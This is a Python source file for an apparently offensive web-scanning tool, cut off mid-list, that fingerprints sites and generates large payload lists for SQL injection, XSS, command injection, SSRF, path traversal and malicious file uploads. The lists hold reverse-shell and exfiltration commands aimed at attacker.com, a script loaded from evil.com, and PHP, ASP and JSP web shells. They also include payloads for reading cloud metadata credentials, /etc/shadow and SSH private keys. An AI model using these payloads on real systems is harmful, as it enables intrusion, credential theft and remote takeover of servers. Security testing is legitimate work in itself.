import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote, unquote
import concurrent.futures
import time
import re
import json
import sys
import hashlib
import difflib
import statistics
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from typing import Optional, List, Dict, Set, Tuple, Any
from dataclasses import dataclass, field, asdict
from datetime import datetime
from colorama import Fore, Style, init
import logging
from enum import Enum
import base64
import subprocess
import threading
import html
import os
import random
import string
import xml.etree.ElementTree as ET
from Crypto.Cipher import AES
import secrets
import urllib3
import socket
import ssl
from http.client import HTTPConnection
import tldextract
from collections import Counter, defaultdict
import itertools

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


# Setup comprehensive logging
class DualFileHandler(logging.FileHandler):
    def __init__(self, filename):
        super().__init__(filename, encoding='utf-8')
        self.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))


log_handler = DualFileHandler('pentest_detailed.log')
logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG)
logger.addHandler(log_handler)








# Data classes (same as before, but updated)
@dataclass
class HTTPBaseline:
    status_code: int
    content_length: int
    response_time: float
    response_hash: str
    response_text: str
    headers: Dict
    title: str


@dataclass
class TestResult:
    injection_point: str
    parameter: str
    payload: str
    method: str
    response_time: float
    status_code: int
    content_length: int
    response_text: str
    detection_indicators: List[str]


@dataclass
class Vulnerability:
    vuln_type: str
    severity: str
    cwe_id: str
    cvss_score: float
    url: str
    parameter: str
    payload: str
    detection_method: str
    evidence: List[str]
    confirmed: bool
    confidence: int
    remediation: str
    code_example: str
    reproduction_steps: List[str]
    curl_command: str
    test_results: List[TestResult] = field(default_factory=list)
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self):
        data = asdict(self)
        data['test_results'] = [asdict(r) for r in self.test_results]
        return data


# --- ADVANCED RECONNAISSANCE ENGINE ---
class ReconnaissanceEngine:
    def __init__(self, target_url: str, session: requests.Session):
        self.target_url = target_url
        self.session = session
        self.domain_info = {}
        self.technology_stack = set()
        self.js_files = []
        self.api_endpoints = []
        self.hidden_paths = []

    def gather_technologies(self, response: requests.Response):
        """Detect technologies from headers and content"""
        headers = response.headers

        # Server detection
        if 'Server' in headers:
            self.technology_stack.add(f"Server: {headers['Server']}")

        # Framework detection
        frameworks = {
            'X-Powered-By': 'PHP/.NET',
            'X-Generator': 'CMS',
            'X-Drupal-Cache': 'Drupal',
            'X-Varnish': 'Varnish',
            'X-Cache': 'CDN',
            'CF-Ray': 'Cloudflare',
        }

        for header, tech in frameworks.items():
            if header in headers:
                self.technology_stack.add(f"{tech}: {headers[header]}")

        # Content analysis
        content = response.text

        # JavaScript frameworks
        js_frameworks = {
            'React': r'React\.|react-dom',
            'Vue.js': r'Vue\.|vue\.js',
            'Angular': r'angular\.|ng-',
            'jQuery': r'jQuery\.|\$\.',
            'Bootstrap': r'bootstrap',
        }

        for framework, pattern in js_frameworks.items():
            if re.search(pattern, content, re.IGNORECASE):
                self.technology_stack.add(f"JS Framework: {framework}")

        # CMS detection
        cms_patterns = {
            'WordPress': r'wp-content|wp-includes|wordpress',
            'Joomla': r'joomla|Joomla!',
            'Drupal': r'drupal|Drupal',
            'Magento': r'magento|Magento',
        }

        for cms, pattern in cms_patterns.items():
            if re.search(pattern, content, re.IGNORECASE):
                self.technology_stack.add(f"CMS: {cms}")

        return list(self.technology_stack)

    def extract_js_files(self, content: str, base_url: str):
        """Extract JavaScript files and analyze for endpoints"""
        soup = BeautifulSoup(content, 'html.parser')

        # Find all script tags
        for script in soup.find_all('script'):
            src = script.get('src')
            if src:
                full_url = urljoin(base_url, src)
                self.js_files.append(full_url)

                # Download and analyze JS content
                self.analyze_js_file(full_url)

    def analyze_js_file(self, js_url: str):
        """Analyze JavaScript file for endpoints and secrets"""
        try:
            response = self.session.get(js_url, timeout=10, verify=False)
            js_content = response.text

            # Find API endpoints
            api_patterns = [
                r'[\"\'](/api/[^\"\']+)[\"\']',
                r'[\"\'](https?://[^/]+/api/[^\"\']+)[\"\']',
                r'fetch\([\"\']([^\"\']+)[\"\']',
                r'axios\.(?:get|post|put|delete)\([\"\']([^\"\']+)[\"\']',
                r'\.ajax\([^\{]*url[\s]*:[\s]*[\"\']([^\"\']+)[\"\']',
            ]

            for pattern in api_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    if not match.startswith('http'):
                        match = urljoin(self.target_url, match)
                    if match not in self.api_endpoints:
                        self.api_endpoints.append(match)

            # Find secrets (API keys, tokens, etc.)
            secret_patterns = [
                r'(?i)api[_-]?key[\"\'\\s]*:[\"\'\\s]*([a-zA-Z0-9_-]{20,})',
                r'(?i)secret[\"\'\\s]*:[\"\'\\s]*([a-zA-Z0-9_-]{20,})',
                r'(?i)token[\"\'\\s]*:[\"\'\\s]*([a-zA-Z0-9_-]{20,})',
                r'(?i)password[\"\'\\s]*:[\"\'\\s]*([a-zA-Z0-9_-]{10,})',
            ]

            for pattern in secret_patterns:
                matches = re.findall(pattern, js_content)
                for match in matches:
                    logger.warning(f"Potential secret found in {js_url}: {match[:20]}...")

        except Exception as e:
            logger.debug(f"Could not analyze JS file {js_url}: {e}")

    def find_hidden_paths(self):
        """Find hidden paths and directories"""
        common_paths = [
            '/admin', '/administrator', '/backend', '/dashboard',
            '/login', '/signin', '/register', '/signup',
            '/api', '/graphql', '/swagger', '/redoc',
            '/wp-admin', '/wp-login.php', '/wp-content',
            '/config', '/backup', '/dump', '/sql',
            '/.env', '/.git', '/.svn', '/.htaccess',
            '/phpinfo.php', '/test.php', '/info.php',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/clientaccesspolicy.xml', '/security.txt',
        ]

        for path in common_paths:
            full_url = urljoin(self.target_url, path)
            try:
                resp = self.session.head(full_url, timeout=5, verify=False)
                if resp.status_code < 400:
                    self.hidden_paths.append({
                        'url': full_url,
                        'status': resp.status_code,
                        'headers': dict(resp.headers)
                    })
            except:
                pass

        return self.hidden_paths


# --- ENHANCED PAYLOAD MUTATION ENGINE ---
class EnhancedPayloadMutator:
    @staticmethod
    def generate_sqli_payloads() -> List[str]:
        """Generate comprehensive SQL injection payloads"""
        payloads = []

        # Basic payloads
        basics = [
            "'",
            '"',
            "`",
            "\\",
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' #",
            "' OR 1=1 -- ",
            "' OR 1=1 #",
            "' OR 'a'='a",
            "' OR 'a'='a' -- ",
            "1' OR '1'='1",
            "1' OR '1'='1' -- ",
            "admin' -- ",
            "admin' #",
            "' UNION SELECT NULL -- ",
            "' UNION SELECT NULL,NULL -- ",
            "' UNION SELECT NULL,NULL,NULL -- ",
        ]
        payloads.extend(basics)

        # Time-based payloads
        time_based = [
            "' AND SLEEP(5) -- ",
            "' AND SLEEP(5) #",
            "' OR SLEEP(5) -- ",
            "' OR SLEEP(5) #",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "' AND BENCHMARK(5000000,MD5('test')) -- ",
            "' OR BENCHMARK(5000000,MD5('test')) -- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- ",
        ]
        payloads.extend(time_based)

        # Error-based payloads
        error_based = [
            "' AND extractvalue(1, concat(0x5c, (SELECT @@version))) -- ",
            "' AND updatexml(1, concat(0x5c, (SELECT @@version)), 1) -- ",
            "' AND (SELECT * FROM (SELECT * FROM (SELECT 1)a)b) -- ",
        ]
        payloads.extend(error_based)

        # Boolean-based payloads
        boolean_based = [
            "' AND 1=1 -- ",
            "' AND 1=2 -- ",
            "' OR '1'='1' -- ",
            "' OR '1'='2' -- ",
        ]
        payloads.extend(boolean_based)

        # Union-based with column detection
        union_payloads = [
            "' UNION SELECT @@version -- ",
            "' UNION SELECT user() -- ",
            "' UNION SELECT database() -- ",
            "' UNION SELECT NULL,@@version -- ",
            "' UNION SELECT NULL,NULL,@@version -- ",
        ]
        payloads.extend(union_payloads)

        # Blind SQLi payloads
        blind_payloads = [
            "' AND (SELECT SUBSTRING(@@version,1,1))='5' -- ",
            "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=53 -- ",
            "' AND IF(1=1,SLEEP(5),0) -- ",
        ]
        payloads.extend(blind_payloads)

        # NoSQL injection payloads
        nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$or": [{"username": "admin"}, {"password": {"$ne": null}}]}',
            'admin\' || \'1\'==\'1',
        ]
        payloads.extend(nosql_payloads)

        # XML injection
        xml_payloads = [
            '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        ]
        payloads.extend(xml_payloads)

        return list(set(payloads))

    @staticmethod
    def generate_xss_payloads() -> List[str]:
        """Generate comprehensive XSS payloads"""
        payloads = []

        # Basic script tags
        scripts = [
            '<script>alert(1)</script>',
            '<script>alert(document.domain)</script>',
            '<script>alert(window.location)</script>',
            '<script>alert(document.cookie)</script>',
            '<script>prompt(1)</script>',
            '<script>confirm(1)</script>',
            '<script>console.log(1)</script>',
            '<script src=//evil.com/xss.js></script>',
        ]
        payloads.extend(scripts)

        # Event handlers
        events = [
            '<img src=x onerror="alert(1)">',
            '<img src=x onerror=alert(1)>',
            '<img src=x onload="alert(1)">',
            '<img src=x onmouseover="alert(1)">',
            '<img src=x onclick="alert(1)">',
            '<svg onload="alert(1)">',
            '<svg/onload="alert(1)">',
            '<body onload="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '<input onfocus="alert(1)" autofocus>',
            '<textarea onfocus="alert(1)" autofocus>',
            '<select onfocus="alert(1)" autofocus>',
            '<details open ontoggle="alert(1)">',
            '<video><source onerror="alert(1)">',
            '<audio><source onerror="alert(1)">',
            '<marquee onstart="alert(1)">',
            '<div onmouseover="alert(1)">Hover me</div>',
        ]
        payloads.extend(events)

        # JavaScript URIs
        js_uris = [
            'javascript:alert(1)',
            'javascript:alert(document.domain)',
            'javascript:alert(document.cookie)',
            'JaVaScRiPt:alert(1)',
            'javascript://alert(1)',
            'javascript://%0aalert(1)',
            'data:text/html,<script>alert(1)</script>',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ]
        payloads.extend(js_uris)

        # Bypass techniques
        bypasses = [
            '"><script>alert(1)</script>',
            '"><script>alert(1)</script><"',
            '\'><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            '"autofocus onfocus=alert(1)//',
            '\'autofocus onfocus=alert(1)//',
            '<script\x20type="text/javascript">javascript:alert(1);</script>',
            '<script\x3Etype="text/javascript">javascript:alert(1);</script>',
            '<script\x0Dtype="text/javascript">javascript:alert(1);</script>',
            '<script\x09type="text/javascript">javascript:alert(1);</script>',
            '<script\x0Ctype="text/javascript">javascript:alert(1);</script>',
            '<script\x2Ftype="text/javascript">javascript:alert(1);</script>',
            '<script\x0Atype="text/javascript">javascript:alert(1);</script>',
        ]
        payloads.extend(bypasses)

        # Polyglot payloads (work in multiple contexts)
        polyglots = [
            r'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e',
            '\'>"><img src=x onerror=alert(1)>',
            '"`\'><script>\u0061\u006C\u0065\u0072\u0074(1)</script>',
            '<svg><script>alert&#40;1&#41</script>',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        ]
        payloads.extend(polyglots)

        # DOM-based XSS
        dom_payloads = [
            '#<script>alert(1)</script>',
            '?param=<script>alert(1)</script>',
            '&param=<script>alert(1)</script>',
            ';param=<script>alert(1)</script>',
        ]
        payloads.extend(dom_payloads)

        # Template injection
        template_payloads = [
            '{{constructor.constructor("alert(1)")()}}',
            '${alert(1)}',
            '#{alert(1)}',
            '<%= alert(1) %>',
            '{{=alert(1)}}',
            '{{ alert(1) }}',
            '{{= 7*7 }}',
            '{{= 7*\'7\' }}',
        ]
        payloads.extend(template_payloads)

        return list(set(payloads))

    @staticmethod
    def generate_command_injection_payloads() -> List[str]:
        """Generate command injection payloads"""
        payloads = []

        # Unix command injections
        unix_commands = [
            ';whoami',
            ';id',
            ';uname -a',
            ';cat /etc/passwd',
            ';cat /etc/shadow',
            ';ls -la',
            ';pwd',
            ';hostname',
            ';ifconfig',
            ';netstat -an',
            ';ps aux',
            ';w',
            ';last',
            ';find / -name "*.txt" 2>/dev/null',
            ';grep -r "password" /etc 2>/dev/null',
            ';curl http://attacker.com/$(whoami)',
            ';wget http://attacker.com/$(id)',
            ';nc -e /bin/bash attacker.com 4444',
            ';bash -i >& /dev/tcp/attacker.com/4444 0>&1',
            ';python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
        ]

        for cmd in unix_commands:
            payloads.extend([
                cmd,  # ;command
                f'|{cmd[1:]}',  # |command
                f'&{cmd[1:]}',  # &command
                f'`{cmd[1:]}`',  # `command`
                f'$({cmd[1:]})',  # $(command)
                f'||{cmd[1:]}',  # ||command
                f'&&{cmd[1:]}',  # &&command
            ])

        # Windows command injections
        windows_commands = [
            '&whoami',
            '&ipconfig',
            '&net user',
            '&net localgroup administrators',
            '&type C:\\Windows\\win.ini',
            '&dir C:\\',
            '&systeminfo',
            '&tasklist',
            '&netstat -ano',
            '&powershell -c "whoami"',
            '&cmd /c whoami',
        ]

        for cmd in windows_commands:
            payloads.extend([
                cmd,
                f'|{cmd[1:]}',
                f'&&{cmd[1:]}',
                f'||{cmd[1:]}',
            ])

        # Special characters
        special_chars = [
            '\nwhoami\n',
            '\r\nwhoami\r\n',
            '\x0awhoami',
            '\x0dwhoami',
            '; sleep 5',
            '| sleep 5',
            '& sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
        ]
        payloads.extend(special_chars)

        # Blind command injection detection
        blind_payloads = [
            '; ping -c 10 127.0.0.1',
            '| ping -n 10 127.0.0.1',
            '& ping -c 10 127.0.0.1',
            '; curl http://attacker.com/$(date)',
            '; wget http://attacker.com/$(date +%s)',
        ]
        payloads.extend(blind_payloads)

        return list(set(payloads))

    @staticmethod
    def generate_ssrf_payloads() -> List[str]:
        """Generate SSRF payloads"""
        payloads = []

        # Localhost variations
        localhost_variants = [
            'http://127.0.0.1',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:5432',
            'http://127.0.0.1:6379',
            'http://127.0.0.1:8080',
            'http://127.0.0.1:9000',
            'http://localhost',
            'http://localhost:80',
            'http://localhost:443',
            'http://localhost:22',
            'http://localhost:3306',
            'http://localhost:8080',
            'http://0.0.0.0',
            'http://0.0.0.0:80',
            'http://[::]',
            'http://[::]:80',
        ]
        payloads.extend(localhost_variants)

        # Internal network ranges
        internal_ranges = [
            'http://192.168.0.1',
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://10.1.1.1',
            'http://172.16.0.1',
            'http://172.31.255.255',
        ]
        payloads.extend(internal_ranges)

        # AWS metadata
        aws_metadata = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
        ]
        payloads.extend(aws_metadata)

        # GCP metadata
        gcp_metadata = [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
        ]
        payloads.extend(gcp_metadata)

        # Azure metadata
        azure_metadata = [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
            'http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01',
        ]
        payloads.extend(azure_metadata)

        # File protocol
        file_protocol = [
            'file:///etc/passwd',
            'file:///etc/shadow',
            'file:///c:/windows/win.ini',
            'file:///c:/windows/system.ini',
            'file:///etc/hosts',
            'file:///proc/self/environ',
            'file:///proc/self/cmdline',
        ]
        payloads.extend(file_protocol)

        # Other protocols
        other_protocols = [
            'gopher://127.0.0.1:80/_GET%20/HTTP/1.0',
            'dict://127.0.0.1:6379/info',
            'ftp://127.0.0.1:21',
            'ldap://127.0.0.1:389',
            'tftp://127.0.0.1:69/test',
        ]
        payloads.extend(other_protocols)

        # URL bypass techniques
        bypasses = [
            'http://127.0.0.1@evil.com',
            'http://evil.com#127.0.0.1',
            'http://evil.com?redirect=http://127.0.0.1',
            'http://[::ffff:127.0.0.1]',
            'http://0177.0.0.1',
            'http://2130706433',
            'http://0x7f000001',
            'http://127.1',
            'http://127.0.1',
        ]
        payloads.extend(bypasses)

        # DNS rebinding
        dns_rebinding = [
            'http://rbndr.us:53/',
            'http://7f000001.0a00000a.rbndr.us/',
        ]
        payloads.extend(dns_rebinding)

        return list(set(payloads))

    @staticmethod
    def generate_path_traversal_payloads() -> List[str]:
        """Generate path traversal payloads"""
        payloads = []

        # Basic traversal
        basic = [
            '../../../etc/passwd',
            '../../etc/passwd',
            '../etc/passwd',
            '....//....//etc/passwd',
            '..;/etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\windows\\win.ini',
            '..\\windows\\win.ini',
        ]
        payloads.extend(basic)

        # Encoded traversal
        encoded = [
            '%2e%2e%2fetc%2fpasswd',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252fetc%252fpasswd',
            '%252e%252e%252fetc%252fpasswd',
            '..%c0%af..%c0%afetc%c0%afpasswd',
            '..%255c..%255cwindows%255cwin.ini',
        ]
        payloads.extend(encoded)

        # Null byte injection
        null_byte = [
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '../../../etc/passwd\x00.jpg',
            '..\\..\\..\\windows\\win.ini%00',
            '..\\..\\..\\windows\\win.ini%00.txt',
        ]
        payloads.extend(null_byte)

        # Double encoding
        double_encoded = [
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%255c..%255c..%255cwindows%255cwin.ini',
        ]
        payloads.extend(double_encoded)

        # UTF-8 encoding
        utf8 = [
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini',
        ]
        payloads.extend(utf8)

        # Absolute paths
        absolute = [
            '/etc/passwd',
            'c:\\windows\\win.ini',
            'c:/windows/win.ini',
            '/etc/shadow',
            '/proc/self/environ',
            '/proc/self/cmdline',
        ]
        payloads.extend(absolute)

        # Directory listing
        directory = [
            '../../../',
            '../../',
            '../',
            '..\\..\\..\\',
            '..\\..\\',
            '..\\',
        ]
        payloads.extend(directory)

        # PHP wrappers
        php_wrappers = [
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd',
            'expect://whoami',
            'data://text/plain;base64,SSBsb3ZlIFBIUAo=',
        ]
        payloads.extend(php_wrappers)

        return list(set(payloads))

    @staticmethod
    def generate_file_upload_payloads() -> List[str]:
        """Generate malicious file upload payloads"""
        payloads = []

        # PHP shells
        php_shells = [
            '<?php system($_GET["cmd"]); ?>',
            '<?php echo shell_exec($_GET["cmd"]); ?>',
            '<?php eval($_POST["cmd"]); ?>',
            '<?php @preg_replace("/.*/e", $_POST["cmd"], ""); ?>',
            '<?php assert($_POST["cmd"]); ?>',
            '<?php file_put_contents("shell.php", "<?php eval($_POST[cmd]); ?>"); ?>',
        ]

        for shell in php_shells:
            payloads.append(('shell.php', shell))
            payloads.append(('shell.phtml', shell))
            payloads.append(('shell.php5', shell))
            payloads.append(('shell.php7', shell))
            payloads.append(('shell.phar', shell))

        # ASP shells
        asp_shells = [
            '<%@ Page Language="C#" %> <% System.Diagnostics.Process.Start(Request["cmd"]); %>',
            '<% eval request("cmd") %>',
            '<% execute request("cmd") %>',
        ]

        for shell in asp_shells:
            payloads.append(('shell.aspx', shell))
            payloads.append(('shell.ashx', shell))
            payloads.append(('shell.asmx', shell))

        # JSP shells
        jsp_shells = [
            '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            '<% if(request.getParameter("cmd")!=null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); } %>',
        ]

        for shell in jsp_shells:
            payloads.append(('shell.jsp', shell))
            payloads.append(('shell.jspx', shell))

        # HTM/HTML payloads
        html_payloads = [
            ('shell.html', '<script>alert(document.cookie)</script>'),
            ('shell.htm', '<img src=x onerror=alert(document.cookie)>'),
            ('shell.svg', '<svg onload=alert(document.cookie)>'),
            ('shell.xml',
             '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'),
        ]
        payloads.extend(html_payloads)

        # Malicious extensions
        extensions = [
            'shell.php.jpg',
            'shell.php.png',
            'shell.php.gif',
            'shell.php.pdf',
            'shell.phtml.jpg',
            'shell.aspx.jpg',
            'shell.jsp.jpg',
            'shell.html;.jpg',
            'shell.php%00.jpg',
            'shell.php\x00.jpg',
            'shell.php%0a.jpg',
            'shell.php%0d.jpg',
        ]

        for ext in extensions:
            payloads.append((ext, 'test'))

        # Content-Type bypass
        content_types = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/png'),
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'text/plain'),
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/octet-stream'),
        ]

        for filename, content, content_type in content_types:
            payloads.append((filename, content, content_type))

        return payloads

    @staticmethod
    def generate_idor_payloads() -> List[str]:
        """Generate IDOR payloads"""
        payloads = []

        # Numeric ID manipulation
        numeric = [
            '1', '0', '-1', '100', '999', '1000', '9999',
            'true', 'false', 'null', 'undefined',
            'admin', 'user', 'test', 'demo',
        ]
        payloads.extend(numeric)

        # UUID manipulation
        uuid = [
            '00000000-0000-0000-0000-000000000000',
            '11111111-1111-1111-1111-111111111111',
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa',
        ]
        payloads.extend(uuid)

        # Object reference
        object_refs = [
            '../', './', '.../', '..\\', '.\\',
            '/', '\\', '//', '\\\\',
        ]
        payloads.extend(object_refs)

        # Special characters
        special = [
            '%00', '%0a', '%0d', '%20', '%2e', '%2f',
            '\x00', '\x0a', '\x0d', '\x20', '\x2e', '\x2f',
        ]
        payloads.extend(special)

        return list(set(payloads))

    @staticmethod
    def generate_directory_traversal_payloads() -> List[str]:
        """Generate comprehensive directory traversal payloads"""
        payloads = []

        # Basic Unix traversal
        basic_unix = [
            '../../../etc/passwd',
            '../../etc/passwd',
            '../etc/passwd',
            '....//....//etc/passwd',
            '..;/etc/passwd',
            r'..\etc\passwd',
            '..\\..\\..\\etc\\passwd',
        ]
        payloads.extend(basic_unix)

        # Windows traversal
        windows = [
            '..\\..\\..\\windows\\win.ini',
            '..\\..\\windows\\win.ini',
            '..\\windows\\win.ini',
            'C:\\Windows\\win.ini',
            'C:/Windows/win.ini',
            '..\\..\\..\\boot.ini',
        ]
        payloads.extend(windows)

        # Encoded traversal
        encoded = [
            '%2e%2e%2fetc%2fpasswd',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252fetc%252fpasswd',
            '%252e%252e%252fetc%252fpasswd',
            '..%c0%af..%c0%afetc%c0%afpasswd',
            '..%255c..%255cwindows%255cwin.ini',
        ]
        payloads.extend(encoded)

        # Null byte injection
        null_byte = [
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            '../../../etc/passwd\x00.jpg',
            '..\\..\\..\\windows\\win.ini%00',
            '..\\..\\..\\windows\\win.ini%00.txt',
        ]
        payloads.extend(null_byte)

        # Double encoding
        double_encoded = [
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%255c..%255c..%255cwindows%255cwin.ini',
        ]
        payloads.extend(double_encoded)

        # UTF-8 encoding
        utf8 = [
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini',
        ]
        payloads.extend(utf8)

        # Absolute paths
        absolute = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/proc/self/environ',
            '/proc/self/cmdline',
            'c:\\windows\\win.ini',
            'c:/windows/win.ini',
            '/boot.ini',
            '/windows/win.ini',
        ]
        payloads.extend(absolute)

        # Directory listing
        directory = [
            '../../../',
            '../../',
            '../',
            '..\\..\\..\\',
            '..\\..\\',
            '..\\',
            '/',
            'C:\\',
            'C:/',
        ]
        payloads.extend(directory)

        # PHP wrappers
        php_wrappers = [
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'expect://whoami',
            'data://text/plain;base64,SSBsb3ZlIFBIUAo=',
            'zip://path/to/archive.zip#file.txt',
            'phar://path/to/archive.phar/file.txt',
        ]
        payloads.extend(php_wrappers)

        # Log file poisoning
        logs = [
            '../../../var/log/apache2/access.log',
            '../../../var/log/nginx/access.log',
            '../../../var/log/auth.log',
            '..\\..\\..\\windows\\system32\\LogFiles\\HTTPERR\\httperr1.log',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
        ]
        payloads.extend(logs)

        # Configuration files
        configs = [
            '../../../etc/hosts',
            '../../../etc/nginx/nginx.conf',
            '../../../etc/apache2/apache2.conf',
            '../../../web.config',
            '../../../.htaccess',
            '../../../config.php',
            '../../../settings.php',
            '../../../database.php',
            '..\\..\\..\\web.config',
            '..\\..\\..\\app.config',
        ]
        payloads.extend(configs)

        # Backup files
        backups = [
            '../../../backup.zip',
            '../../../backup.tar',
            '../../../dump.sql',
            '../../../database.sql',
            '..\\..\\..\\backup.zip',
            '..\\..\\..\\backup.rar',
            'index.php.bak',
            'index.php~',
            'index.php.backup',
            '.index.php.swp',
        ]
        payloads.extend(backups)

        # Source code files
        source_code = [
            '../../../index.php',
            '../../../main.py',
            '../../../app.js',
            '../../../server.js',
            '../../../package.json',
            '../../../composer.json',
            '../../../Gemfile',
            '..\\..\\..\\index.aspx',
            '..\\..\\..\\web.config',
        ]
        payloads.extend(source_code)

        # Environment files
        env_files = [
            '../../../.env',
            '../../../.env.example',
            '../../../.env.local',
            '../../../.env.production',
            '..\\..\\..\\.env',
            '..\\..\\..\\.env.example',
        ]
        payloads.extend(env_files)

        # Git files
        git_files = [
            '../../../.git/config',
            '../../../.git/HEAD',
            '../../../.git/index',
            '../../../.git/logs/HEAD',
            '../../../.git/refs/heads/master',
            '..\\..\\..\\.git\\config',
            '..\\..\\..\\.git\\HEAD',
        ]
        payloads.extend(git_files)

        # SSH files
        ssh_files = [
            '../../../.ssh/id_rsa',
            '../../../.ssh/id_dsa',
            '../../../.ssh/authorized_keys',
            '../../../.ssh/known_hosts',
            '..\\..\\..\\.ssh\\id_rsa',
            '..\\..\\..\\.ssh\\id_dsa',
        ]
        payloads.extend(ssh_files)

        # Special Unix files
        special_unix = [
            '/dev/null',
            '/dev/zero',
            '/dev/random',
            '/dev/urandom',
            '/proc/self/maps',
            '/proc/self/status',
            '/proc/self/fd/0',
        ]
        payloads.extend(special_unix)

        # Combined techniques
        combined = [
            '....//....//....//etc//passwd',
            '..\\..\\..\\..\\..\\windows\\win.ini',
            '/etc/passwd%00.jpg',
            '/etc/passwd%2500.jpg',
            '/etc/passwd%00',
            '/etc/passwd%0a',
            '/etc/passwd%0d',
            '/etc/passwd%20',
        ]
        payloads.extend(combined)

        # Windows UNC paths
        unc_paths = [
            '\\\\localhost\\C$\\Windows\\win.ini',
            '\\\\127.0.0.1\\C$\\Windows\\win.ini',
            '\\\\%COMPUTERNAME%\\C$\\Windows\\win.ini',
            'file://///localhost/C$/Windows/win.ini',
        ]
        payloads.extend(unc_paths)

        # Special protocols
        protocols = [
            'file:///etc/passwd',
            'file:///C:/Windows/win.ini',
            'ftp://anonymous:anonymous@localhost/etc/passwd',
            'smb://localhost/C$/Windows/win.ini',
        ]
        payloads.extend(protocols)

        return list(set(payloads))

    @staticmethod
    def generate_advanced_sqli_payloads() -> List[str]:
        """Generate advanced SQL injection payloads"""
        payloads = EnhancedPayloadMutator.generate_sqli_payloads()

        # Add advanced payloads
        advanced = [
            # Boolean-based blind
            "' AND (SELECT SUBSTRING((SELECT @@version),1,1))='5' -- ",
            "' AND (SELECT ASCII(SUBSTRING((SELECT @@version),1,1)))=53 -- ",

            # Time-based with subqueries
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=10 -- ",

            # Error-based with subqueries
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",
